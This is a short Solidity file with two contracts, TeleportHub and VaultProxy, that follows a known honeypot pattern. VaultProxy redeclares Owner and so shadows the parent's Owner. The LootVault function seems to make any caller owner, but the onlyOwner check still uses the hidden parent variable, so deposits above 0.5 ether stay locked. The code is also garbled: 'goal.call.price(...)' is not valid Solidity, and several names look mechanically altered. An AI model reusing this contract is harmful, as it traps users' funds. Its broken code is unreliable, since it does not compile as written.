pragma solidity ^0.4.24;

contract TeleportHub  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function tradefundsMaster(address _owner) public onlyOwner { Owner = _owner; }
    function teleportHub(address goal, bytes info) public payable {
        goal.call.price(msg.value)(info);
    }
}

contract VaultProxy is TeleportHub {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function LootVault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            bankWinnings();
        }
    }

    function bankWinnings() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function obtainPrize(uint256 sum) public onlyOwner {
        if (sum>0 && Deposits[msg.sender]>=sum) {
            msg.sender.transfer(sum);
        }
    }
}